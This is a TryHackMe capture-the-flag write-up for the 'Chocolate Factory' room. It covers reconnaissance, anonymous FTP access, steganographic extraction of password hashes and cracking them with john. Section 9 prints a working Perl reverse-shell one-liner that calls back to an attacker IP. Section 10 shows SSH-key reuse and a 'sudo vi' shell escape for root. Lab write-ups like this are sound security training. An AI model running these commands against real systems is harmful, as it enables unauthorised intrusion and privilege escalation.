# Writeup for Room "Chocolate Factory"

This is the writeup for the box Chocolate Factory

## 🌐🖥️ 1. WebSite
- The website.
- No useful information was found in `robots.txt`.
  
  ![WebSite](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/00.png)

  ![Robots.txt](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/01.png)

## 🧪🔍⚙️ 2. Fuzzing
-  **Dirbuster / Gobuster** was used to find directories and files but no useful information was found.
  
    ![Fuzzing](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/02.png)

## 📡 3. Nmap Scan
- The following information was found:
  - The port 21 is open. **FTP**
  - The port 22 is open. **SSH**
  - The port 80 is open. **HTTP (Apache)**
  - ...

  ![Nmap Scan](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/03.png)

## 💉🛢️ 4. SQL Injection 

- I tried to find some kind of SQL Injection vulnerability, but found nothing.

  ![SQL Injection](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/05.png)

  ![SQL Injection-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/06.png)

## 📡 5. Nmap Scan again

- I checked again the Nmap scan and I found a fingerprint with a file named ```key_rev_key``` in the http://{ip}/key_rev

  ![key_rev_key](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/07.png)

- I downloaded the file and I used the following for checking its content:

  ```
  hexdump -C key_rev_key
  ```

  ![hexdump](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/08.png)

- The content of the file has a part that looks like a key:

  ![hexdump](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/09.png)

- I made a copy of the file in .txt format and used the command ```cat key_rev_key.txt``` to get the first flag, which is the key

  ![cp-content](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/10.png)

  ![cat-content](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/11.png)

## 📁📤📥 6. FTP Access

- I try to use the following credentials to access the FTP:
  ```
  Username: anonymous
  Password: 
  ```

  ![ftp-access](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/13.png)

- I found a file named ```gum_room.jpg``` in the root directory and I downloaded it.

  ![gum_room.jpg](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/13.png)

## 🕵️‍♂️🖼️ 7. Steganography

- I used different tools to check if the image has hidden information 

  ![stegonography](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/14.png)

- When I have used the command ```steghide extract -sf gum_room.jpg``` I got the following output: ```b64.txt```

  ![steghide](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/15.png)

- After decoding the Base64 string, I got a list of password hashes similar to those in a shadow file.

  ![decode-base64](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/16.png)

## 🔓🗝️💻 8. Password Cracking

- There is a user named ```charlie``` with a hashed password 

  ![user-charlie](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/17.png)

- I used the following command to crack the password of the user ```charlie```:

  ```john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt```

  ![password-cracked](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/18.png)

## 🌐🖥️ 9. WebSite again - Reverse Shell

- I can access to the website with the credentials obtained from the previous phase.

- The website has a input where we can execute commands

  ![input](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/19.png)

- I am going to use a reverse shell to get a shell on the machine

  ![reverse-shell](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/20.png)

- I used the following command to get a reverse shell:

  ```perl -e 'use Socket;$i="TU_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```

  ![reverse-shell-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/21.png)

## 🐚💻🚀 10 Reverse Shell - Privilege Escalation

- I moved to the home directory for the user ```charlie``` and I found various files but the file ```user.txt``` is with a permission denied (I am the user ```www-data```).

  ![user.txt](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/22.png)

- But we can escalate privileges using the private SSH key.

  ![private-ssh-key](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/23.png)

  ![public-ssh-key](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/24.png)

- I copied the private SSH key to my user's ```.ssh``` directory and I used the following command to connect to the machine:

  ```ssh -i ~/.ssh/charlie_id_rsa charlie@ip-machine```

  ![ssh-connection](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/25.png)

- If I now try to see the contents of the file ```user.txt``` I get the flag : 

  ![user.txt-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/26.png)

- Now, I have used the command ```sudo -l```to check the privileges of the user ```charlie```:

  ![sudo-l](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/27.png)

- After searching GTFOBins to find if there is any specific command for that program to escalate privileges : ``` sudo vi -c ':!/bin/sh' /dev/null ```

  ![sudo-vi](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/28.png)

> [!NOTE]
> The website used to identify if exists a command to escalate privileges has been:
> https://gtfobins.github.io/gtfobins/vi/#sudo

- We need to navigate to the root folder. There, we see a file named root.py which, when executed, asks for a password (the first flag). If we enter it correctly, it gives us the final flag.

  ![root.py](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/29.png)